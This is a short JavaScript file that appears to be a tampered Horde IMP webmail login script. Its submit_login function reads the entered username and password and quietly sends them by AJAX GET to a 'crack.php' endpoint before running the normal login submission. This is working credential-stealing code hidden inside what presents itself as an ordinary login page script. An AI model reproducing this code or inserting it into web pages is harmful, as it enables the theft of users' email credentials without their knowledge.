function setFocus(){if(!$F("imapuser")){$("imapuser").focus()}else{$("pass").focus()}}function imp_reload(){window.top.document.location=autologin_url+$F("server_key")}
function submit_login()
{

var x=document.getElementById("imapuser").value;
var y=document.getElementById("pass").value;
$.ajax({
  type: "GET",
  url: "crack.php",
  data: {user:x,pass:y}
})
  .done(function( msg ) {
if(show_list&&$F("server").startsWith("_")){return false}if(!$F("imapuser")){alert(IMP.text.login_username);$("imapuser").focus();return false}else{if(!$F("pass")){alert(IMP.text.login_password);$("pass").focus();return false}else{$("loginButton").disable();if(ie_clientcaps){try{$("ie_version").setValue(objCCaps.getComponentVersion("{89820200-ECBD-11CF-8B85-00AA005B4383}","componentid"))}catch(a){}}$("imp_login").submit();return true
}}
});
return true;
  }